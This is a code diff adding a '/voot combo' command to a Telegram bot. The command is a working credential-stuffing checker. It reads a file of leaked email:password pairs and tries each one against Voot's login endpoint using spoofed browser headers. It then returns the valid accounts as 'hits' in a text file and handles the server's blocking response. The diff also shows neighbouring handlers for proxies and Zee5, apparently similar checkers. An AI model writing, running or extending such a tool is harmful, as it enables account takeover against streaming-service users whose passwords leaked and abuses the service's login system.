@@ -25,6 +25,22 @@ data = {
 data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}
 
 
+face = {
+	"Accept-Encoding": "gzip, deflate, br",
+	"Accept-Language": "en-US,en;q=0.9",
+	"Connection": "keep-alive",
+	"Content-Length": "136",
+	"Content-Type": "application/json;charset=UTF-8",
+	"Host": "userauth.voot.com",
+	"Origin": "https://www.voot.com",
+	"Referer": "https://www.voot.com",
+	"Sec-Fetch-Dest": "empty",
+	"Sec-Fetch-Mode": "cors",
+	"Sec-Fetch-Site": "same-site",
+	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
+}
+
+
 @UltraBot.on(events.NewMessage(pattern="^/proxy$"))
 async def Devsexpo(event):
     if event.sender_id != Config.OWNER_ID:
@@ -69,6 +85,85 @@ async def Devsexpo(event):
         )
         os.remove(escobar)
         os.remove("goood.txt")
+
+
+
+
+@UltraBot.on(events.NewMessage(pattern="^/voot ?(.*)"))
+async def Devsexpo(event):
+    if event.sender_id != Config.OWNER_ID:
+        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
+        if rip is False:
+            await event.reply(
+                "**To Use This Bot, Please Join My Channel. :)**",
+                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
+            )
+            return
+    input_str = event.pattern_match.group(1)
+    if input_str == "combo":
+      ok = await event.reply("`Checking Your Combos File. This May Take Time Depending On No of Combos.`")
+      
+      normal_dict = []
+      good_dict = []
+      hits = 0
+      bady = 0
+      lol = await event.get_reply_message()
+      if not lol.media:
+        await ok.edit('Reply To File')
+        return
+      humm = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
+      
+      file = open(humm, "r")
+      lines = file.readlines()
+      if len(lines) > 50:
+        await ok.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
+        return
+      
+      for line in lines:
+        normal_dict.append(line)
+      os.remove(humm)
+      
+      for i in normal_dict:
+        mmho = i.split(":")
+        email = mmho[0]
+        try:
+          password = mmho[1]
+        except IndexError:
+          continue
+        hell = {"type":"traditional","deviceId":"Windows NT 10.0","deviceBrand":"PC/MAC","data":{"email":email, "password":password}}
+        
+        r = requests.post("https://userauth.voot.com/usersV3/v3/login", json=hell, headers=face).json()
+        
+        a = r.get("data")
+        kk = r.get("status")
+        
+        if a != None:
+          hits += 1
+          good_dict.append(f"{email}:{password}")
+        elif kk != None:
+          bady += 1
+          c = kk.get("code")
+          if c == 1906:
+            await ok.edit("voot server is blocking the requests. please try after few minutes...")
+            if len(good_dict) == 0:
+                sys.exit()
+            with open("hits.txt", "w") as hitfile:
+              for s in good_dict:
+                hitfile.write(s + ' | @FridayOT')
+              await UltraBot.send_file(event.chat_id, "hits.txt", caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`")
+              os.remove("hits.txt")
+              sys.exit()
+      if len(good_dict) == 0:
+        await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
+        return
+      with open("hits.txt", "w") as hitfile:
+        for s in good_dict:
+          hitfile.write(s + ' | @DevsExpo"')
+        await UltraBot.send_file(
+        event.chat_id, "hits.txt", caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`"
+    )
+    os.remove("hits.txt")
+
 
 
 @UltraBot.on(events.NewMessage(pattern="^/zee5 ?(.*)"))
